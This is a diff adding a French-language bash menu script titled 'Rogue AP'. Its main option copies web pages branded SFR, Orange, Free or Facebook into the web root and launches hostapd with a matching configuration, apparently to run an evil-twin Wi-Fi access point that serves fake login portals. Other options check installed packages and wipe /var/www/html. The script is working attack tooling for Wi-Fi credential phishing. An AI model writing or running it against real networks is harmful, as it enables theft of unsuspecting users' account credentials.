@@ -1,0 +1,70 @@
+clear
+#!/bin/bash
+
+toilet -F gay -F border "Rogue AP"
+echo  "================================================================================== "
+echo "Faites votre choix"
+echo "  1)Savoir si les packages sont présents ✅"
+echo "  2)Choix du point d'accès"
+echo "  3)"
+echo "  4)Quitter"
+echo "================================================================================= "
+read n
+case $n in
+
+1) read -p "Veuillez saisir le nom du package " variable
+        while [[ ! -z "$variable" ]]
+        do
+        test=$(dpkg -l "*$variable*")
+        echo "$test"
+        read -p "Veuillez saisir le nom du package " variable
+        if [[ -z "$variable" ]]; then
+        echo "Empty $variable"  
+       fi
+        sleep 5 && clear 
+        done
+;;
+2)
+clear
+echo
+PS3='Faites votre choix: '
+options=("Option 1 - SFR" "Option 2 - ORANGE" "Option 3 - FREE" "Option 4 - FACEBOOK" "Option 5 - clean" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+        "Option 1 - SFR")
+            echo "you chose choice 1 - SFR"
+            cp -r /var/www/html/sfr/* /var/www/html
+            hostapd sfr-hostapd.conf
+            ;;
+        "Option 2 - ORANGE")
+            echo "you chose choice 2 - ORANGE"
+            cp -r /var/www/html/orange/* /var/www/html
+            hostapd orange-hostapd.conf
+            ;;
+        "Option 3 - FREE")
+            echo "you chose choice 3 - FREE"
+            cp -r /var/www/html/free/* /var/www/html
+            hostapd free-hostapd.conf
+            ;;
+        "Option 4 - FACEBOOK")
+            echo "you chose choice 4 - FACEBOOK"
+            cp -r /var/www/html/facebook/* /var/www/html
+            hostapd facebook-hostapd.conf
+            ;;
+        "Option 5 - clean")
+            echo "you chose choice 5 - clean"
+            rm -r /var/www/html/*
+            ;;
+        "Quit")
+            break
+            ;;
+        *) echo "invalid option $REPLY";;
+    esac
+done
+;;
+  4) echo "You chose Option 4"
+                clear;;
+esac
+
+
